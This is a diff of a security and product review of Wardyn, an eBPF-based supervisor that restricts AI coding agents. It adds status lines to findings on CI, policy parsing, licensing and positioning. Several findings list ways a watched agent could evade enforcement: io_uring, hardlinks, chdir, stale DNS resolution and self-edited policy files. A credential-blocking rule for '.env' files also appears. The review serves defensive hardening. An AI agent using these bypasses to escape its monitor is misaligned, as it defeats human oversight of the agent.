 ### 🟠 YÜKSEK — CI compiles the eBPF object but never loads it — the enforcement paths, verifier acceptance, and every map interaction are untested
 *`dx` · efor: L · id: `ci-never-loads-the-ebpf-object`*
+
+> **Durum:** ✅ **Kapatıldı** — see `no-ebpf-load-in-ci`.
 
 - **Konum:** `.github/workflows/ci.yml:44-52`
 - **Sorun:** The CI job runs fmt, clippy, `cargo build` and `cargo test`. The tests cover the policy engine and the tracefs format parser only; not one line of eBPF code, map population, program attach, or denial behaviour is exercised. The workflow file says so explicitly. For a project where the product *is* the kernel behaviour, this means the test suite validates the least risky third of the codebase. A verifier rejection, a map-type mismatch, an offset regression, or a broken `apply_exception` would all pass CI green.
@@ -1213,6 +1449,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🟠 YÜKSEK — The "agent-scoped subtree" differentiator has been commoditized by the agent vendors; reposition as a supervisor/forensics layer, not an isolator
 *`positioning` · efor: S · id: `positioning-commoditized-by-vendor-sandboxes`*
 
+> **Durum:** ⏸️ **Bilerek açık** — answered in COMPARISON.md rather than in code.
+
 - **Konum:** `README.md:40-48, ARCHITECTURE.md:11-16`
 - **Sorun:** The README frames Wardyn against "userspace guards (seccomp wrappers, LD_PRELOAD, ptrace)" being "bypassable and race-prone". That comparison is a straw man in 2026. Claude Code ships a first-party sandbox that uses bubblewrap for filesystem isolation plus `bwrap --unshare-net` with a `socat`-relayed allowlisting HTTP(S) proxy for egress. Codex CLI ships bubblewrap + Landlock + an in-process seccomp filter that blocks `ptrace`, `process_vm_readv/writev`, `io_uring_*` and every socket family except `AF_UNIX` in restricted-network mode. Both are *isolators*: filesystem namespaces, read-only roots, no-new-privs. Wardyn is a *supervisor*: it observes and denies specific operations but never removes the ambient authority — the watched tree keeps full write access to everything, can still `io_uring` around the tracepoints, and Wardyn itself acknowledges it does not defend against a root-capable child (SECURITY.md:69-72). The README's claim that the watched process "can't see it, can't unload it" is true but answers a question nobody is asking; the question is "what can it still do?".
 - **Etki:** A knowledgeable evaluator's first question is "why not just use the sandbox my agent already ships?", and the README has no answer. That kills adoption and, worse, invites the conclusion that the author has not surveyed the field — fatal for a security tool from a single unknown author.
@@ -1220,6 +1458,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### 🟠 YÜKSEK — "Reuse Landlock/Tetragon instead of hand-rolled offsets" is half right: Landlock should own the filesystem axis, eBPF should keep egress — but the policy model must change
 *`positioning` · efor: XL · id: `landlock-hybrid-not-replacement`*
+
+> **Durum:** ✅ **Kapatıldı** — `allow_paths:` ships as containment beside the block rules, not instead of them.
 
 - **Konum:** `wardyn/src/policy.rs (policy model), wardyn/src/main.rs:574-604 (spawn path)`
 - **Sorun:** The framing question is whether to abandon hand-rolled eBPF for a battle-tested engine. The honest answer splits by axis. For **files/exec**, Landlock is strictly better on every dimension Wardyn currently struggles with: it is maintained in-tree (no offsets, no BTF, no verifier fights), enforces on the resolved path hierarchy (no basename over-reach), distinguishes ~15 access rights including read vs write vs exec vs truncate, needs **no root at all**, is inherited across `fork`/`exec` exactly matching Wardyn's subtree model, and since ABI 7 (Linux 6.15) logs denied requests to audit. For **network**, Landlock is not a substitute: ABI 4 restricts only TCP `bind`/`connect` *by port*, with no address or CIDR concept and no UDP — Wardyn's `NET_RULES` LPM trie over IPv4/IPv6 with `sendmsg4/6` gating does something Landlock cannot express. Tetragon is not a swap-in either: it is a cluster/node-scoped daemon driven by `TracingPolicy` CRDs with `matchBinaries`/pod selectors, ~30MB of Go and a k8s-shaped operational model; it has no notion of "scope to this one subtree I just launched from my laptop shell", which is Wardyn's whole premise.
@@ -1229,6 +1469,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🟡 ORTA — The policy parser ignores unknown keys and the declared `version`, so a typo silently disables an entire rule class
 *`correctness` · efor: S · id: `policy-schema-silently-ignores-unknown-keys`*
 
+> **Durum:** ✅ **Kapatıldı** — `deny_unknown_fields`.
+
 - **Konum:** `wardyn/src/policy.rs:130-155`
 - **Sorun:** `RawPolicy` derives `Deserialize` without `#[serde(deny_unknown_fields)]`, and every rule list is `#[serde(default)]`. A user who writes `file:` instead of `files:`, or `networks:` instead of `network:`, gets a policy that parses cleanly, reports `0 file rule(s)` in a log line most users will not read, and enforces nothing. The declared `version: 1` present in all three shipped policy files is explicitly parsed-and-discarded, so there is no mechanism to reject a future v2 policy file when it is fed to a v1 binary — it will simply be misinterpreted, with the same silent-empty-ruleset outcome.
 - **Etki:** A silent-empty-policy is the worst failure mode a policy engine can have: the tool runs, the TUI is green, the audit log is empty, and the user concludes the agent is well-behaved. It is also a supply-chain-shaped risk — a policy file edited by the agent itself, or a merge conflict, can degrade protection with no diagnostic.
@@ -1236,6 +1478,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### 🟡 ORTA — No tags, no releases, no binaries, no container image, no man page, no completions, no MSRV — nothing is installable
 *`dx` · efor: M · id: `no-release-artifacts-or-distribution`*
+
+> **Durum:** ✅ **Kapatıldı** — tagged releases build x86_64 and aarch64 musl binaries.
 
 - **Konum:** `Cargo.toml:9, .github/workflows/, wardyn/src/main.rs:191-270, README.md:14-18`
 - **Sorun:** `git tag -l` is empty despite `version = "0.1.0"` in the workspace manifest and a CHANGELOG whose top section reads `## [0.1.0] — unreleased (development)`. There is no release workflow, so there is no way to obtain Wardyn other than cloning, installing Rust nightly, installing `bpf-linker` (which compiles LLVM bindings and takes minutes), and building. There is no man page, no shell completions, no `rust-version`/MSRV declaration anywhere in the workspace, and the CLI is hand-rolled `std::env::args()` parsing that only accepts options before the mode keyword.
@@ -1245,6 +1489,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🟡 ORTA — The crate cannot be published to crates.io as structured — build.rs reaches outside the package root
 *`dx` · efor: M · id: `crates-io-publish-structurally-broken`*
 
+> **Durum:** 🔓 **Açık** — see `cargo-publish-broken`.
+
 - **Konum:** `wardyn/build.rs:8-16, wardyn-ebpf/Cargo.toml`
 - **Sorun:** `wardyn/build.rs` invokes `aya_build::build_ebpf` with `root_dir` pointing at a sibling directory via `../wardyn-ebpf`. Cargo packages only files under the package root into the `.crate` tarball, so that path does not exist for anyone who runs `cargo install wardyn`. Compounding it, `wardyn-ebpf` is marked `publish = false`, and even if the source were present the build would require the consumer to have a nightly toolchain with `rust-src` plus `bpf-linker` on `$PATH` — none of which `cargo install` provides or checks. The crate metadata is otherwise fully prepared for publication (description, keywords, categories, repository, homepage all set), which suggests publishing is intended.
 - **Etki:** `cargo install wardyn` — the discovery path most Rust users try first — will fail at build time with a confusing error about a missing directory, or with a `bpf-linker not found` error. A failed `cargo install` is worse than no crates.io presence at all.
@@ -1252,6 +1498,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### 🟡 ORTA — No read-vs-write distinction: `block` on a secret also blocks writing it, and "writable" cannot be expressed at all
 *`feature` · efor: M · id: `no-read-write-distinction`*
+
+> **Durum:** ✅ **Kapatıldı** — the `access:` axis.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:360-389, wardyn/src/policy.rs:143-148`
 - **Sorun:** `try_file_open` receives the `struct file *` — which carries `f_flags` and `f_mode`, containing `O_WRONLY`/`O_RDWR`/`FMODE_WRITE`/`FMODE_EXEC` — and never reads them. It matches solely on the dentry basename and its parent-dir name. The `sys_enter_openat` observation path has the same gap: `emit_path_event` reads only the filename at `OPENAT_FILENAME_OFFSET`, never the flags argument two slots further in. The policy language has no vocabulary for it either — `PathRuleRaw` is `{ match, action }` with no access-mode field. So `{ match: "**/.env", action: block }` denies the agent *writing* a `.env` as well as reading one, and there is no way to write the rule most users actually want ("the agent may create and edit files under the project, but may not read credentials, and may not write outside the workspace").
@@ -1261,6 +1509,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🟡 ORTA — No structured event stream, no metrics, no non-interactive exception path — the tool is unusable from another program
 *`feature` · efor: L · id: `no-machine-interface`*
 
+> **Durum:** ✅ **Kapatıldı** — `--format json` with a versioned schema in docs/EVENT_SCHEMA.md.
+
 - **Konum:** `wardyn/src/main.rs:637-679, wardyn/src/tui.rs:344-353, wardyn/src/audit.rs:57-66`
 - **Sorun:** Every output surface is human-shaped or file-shaped. Stdout in non-TTY mode is a fixed-width text table; there is no `--json` line-delimited event stream. The audit log is JSONL but has no `schema_version` and is a side-effect file rather than a stream. There are no metrics of any kind. Critically, approve-once exceptions exist **only** in the TUI: `run_plain` constructs an empty `Exceptions` and the code comments that no exceptions can be granted there, so under CI, `--plain`, or any piped invocation the deny→report→approve→retry loop that the README presents as the product's closing act simply does not exist. There is also no daemon or multi-target mode — one `wardyn` process supervises exactly one launched command, so supervising three concurrent agents means three root processes each attaching their own cgroup programs to `/sys/fs/cgroup` with `CgroupAttachMode::Single`.
 - **Etki:** Wardyn cannot be embedded in anything: not a CI pipeline, not an agent harness, not a monitoring stack, not a multi-agent setup. For a tool whose stated audience is autonomous agents, being drivable only by a human at a terminal is a structural ceiling. `CgroupAttachMode::Single` also means the second concurrent invocation fails or displaces the first — a footgun for anyone running more than one agent.
@@ -1268,6 +1518,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### 🟡 ORTA — `domain:` rules are resolved once at startup, so allowlists go stale and blocklists are trivially bypassed
 *`correctness` · efor: M · id: `domain-rules-resolved-once-at-load`*
+
+> **Durum:** ✅ **Kapatıldı** — 60s refresh.
 
 - **Konum:** `wardyn/src/policy.rs:281-301, 593-599`
 - **Sorun:** A `{ domain: "github.com", action: allow }` rule is expanded at load time into one `NetMatch::V4Ip`/`V6Ip` rule per address returned by a single `to_socket_addrs()` call, and those addresses are then frozen into the LPM trie for the life of the run. Nothing re-resolves. For CDN-fronted hosts (github.com, registry.npmjs.org, api.anthropic.com — all three are in the shipped default policy) the address set rotates within minutes, so a long-running agent session will start seeing legitimate traffic to allowlisted domains hit the `{ cidr: "0.0.0.0/0", action: block }` catch-all. In the other direction, a `block` domain rule is defeated by any resolution that returns an address the load-time lookup did not, which an adversarial agent controls completely if it controls the name. A resolution failure degrades to a `log::warn!` and the rule is dropped entirely — and in TUI mode the logger is never even initialised, so that warning goes nowhere.
@@ -1277,6 +1529,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🟡 ORTA — The eBPF object declares no license (relying on aya's silent "GPL" default) while the project is AGPL-3.0 — a legal loose end plus a real adoption tax
 *`positioning` · efor: S · id: `ebpf-object-license-declaration-and-agpl`*
 
+> **Durum:** ✅ **Kapatıldı** — the kernel-side crates are dual-licensed `GPL-2.0-only OR AGPL-3.0-or-later`.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:1-24, Cargo.toml:11, README.md:239-253`
 - **Sorun:** Two coupled issues. (1) `wardyn-ebpf/src/main.rs` contains no `link_section = "license"` static — aya's own template requires one (`#[unsafe(link_section = "license")] #[unsafe(no_mangle)] static LICENSE: [u8; 13] = *b"Dual MIT/GPL\0";`). Wardyn's programs load only because aya-obj defaults to `CString::new("GPL")` when the ELF has no license section. That matters materially here: BPF LSM programs are *required* to be GPL-compatible (`bpf_lsm_verify_prog`: "LSM programs must have a GPL compatible license"), and `bpf_probe_read_kernel`/`bpf_probe_read_user` are GPL-only helpers. So Wardyn is declaring GPLv2 to the kernel by library accident, in a project whose source is AGPL-3.0-or-later — which is not GPLv2-compatible, and whose string the kernel's `license_is_gpl_compatible()` would reject outright if it were declared honestly. (2) AGPL-3.0 on a developer CLI is an adoption tax with almost no upside: Wardyn is not a network service, so the AGPL's §13 trigger rarely fires, while many companies maintain blanket AGPL bans that would prevent it appearing in a CI image or a devcontainer. Every comparable tool in this space (Tetragon, Tracee, Falco) is Apache-2.0.
 - **Etki:** Functionally benign today (aya's default keeps it loading) but fragile — if aya ever changes that default, or if the object is loaded by any other loader (`bpftool`, libbpf, a future daemon), LSM attach fails with `-EINVAL` and, because `attach_lsm` failure is non-fatal, the user silently drops to network-only enforcement with a warning. Legally it is an unresolved question for anyone redistributing: what license is the kernel-loaded object actually under? Commercially, AGPL keeps Wardyn out of exactly the environments (corporate CI, vendored devcontainers, agent platform images) where it would get real usage.
@@ -1284,6 +1538,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### 🟡 ORTA — Zero performance data for a tool that intercepts every file open in a subtree
 *`positioning` · efor: M · id: `no-published-overhead-numbers`*
+
+> **Durum:** ✅ **Kapatıldı** — docs/PERFORMANCE.md, reproducible with scripts/bench.sh.
 
 - **Konum:** `wardyn/src/main.rs:486-496, README.md:64-68`
 - **Sorun:** Wardyn attaches an LSM program to `file_open`, which fires on every single open in the system (the hook is global; the `is_watched(pid)` check is what scopes it), plus three cgroup programs attached to `/sys/fs/cgroup` with `CgroupAttachMode::Single`, plus six-plus tracepoints. There is not a single benchmark, latency number, or throughput claim in the repo. Note that the cgroup programs are attached to the *root* cgroup, meaning every `connect()` on the host runs `try_connect4` and does a `is_watched()` hash lookup before returning ALLOW — a whole-host cost, not a subtree cost, even though the README promises "the rest of the system is never affected".
@@ -1293,6 +1549,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 ### 🟡 ORTA — Governance is single-maintainer with no versioned security guarantees, no semver policy for the wire/policy formats, and a threat model that stops at one page
 *`positioning` · efor: M · id: `governance-and-security-guarantees-thin`*
 
+> **Durum:** 🔓 **Açık** — SECURITY.md exists; there is no GOVERNANCE.md and no stated support window.
+
 - **Konum:** `SECURITY.md:48-72, CHANGELOG.md:6-7, .github/CODEOWNERS`
 - **Sorun:** SECURITY.md is genuinely above average for a 0.1 project — it names in-scope and out-of-scope classes and admits fail-open, observe-only rules, and offset drift. But it stops short of what a security tool needs before anyone deploys it: there is no statement of what Wardyn *guarantees* at a given version, no enumeration of known bypasses (the watched tree can use `io_uring` to issue file operations that never hit the traced syscalls; it can hardlink a blocked basename to an unblocked one since matching is by dentry name; it can `chdir` to defeat the relative-path reconstruction; on kernels without BPF LSM, file/exec enforcement silently does not exist), no CVE/advisory process beyond "report privately", and no semver policy covering the two formats that are already de-facto public APIs (the audit JSONL schema and `policy.yaml`). CODEOWNERS lists one person, and the repo has no succession or bus-factor statement.
 - **Etki:** A team evaluating Wardyn cannot answer "what am I promised, and what breaks on upgrade?". The undocumented bypass list is the bigger issue: a security tool that has not published its own defeat conditions will have them published for it, and that framing ("researcher finds trivial bypass in AI agent security tool") is far more damaging than shipping them yourself as known limitations.
@@ -1300,6 +1558,8 @@ The same structure blocks a cheap CI win: a `macos-latest`/`windows-latest` leg 
 
 ### ⚪ DÜŞÜK — No containers/k8s story and no agent-framework integration beyond an env var — the two channels where the audience actually lives
 *`feature` · efor: M · id: `no-container-k8s-or-mcp-integration-story`*
+
+> **Durum:** 🔓 **Açık** — `.devcontainer/` ships; there is no Dockerfile, DaemonSet or MCP server.
 
 - **Konum:** `README.md:124-162, 215-225`
 - **Sorun:** Wardyn already does the hard part for containers — it detects pid namespaces and learns its init-ns tgid through the `personality()` handshake, and ARCHITECTURE.md documents the WSL2/container case carefully — but there is no container image, no devcontainer feature, no `docker run` recipe, and no DaemonSet manifest. Likewise, the agent-integration story is a single env var plus a paragraph of prose the user is expected to hand-copy into `CLAUDE.md`. There is no MCP server, no ready-to-include instruction snippet file, and no way for an agent framework to subscribe to denials programmatically. The M4 milestone lists "devcontainer" as in-progress; nothing in the tree implements it.
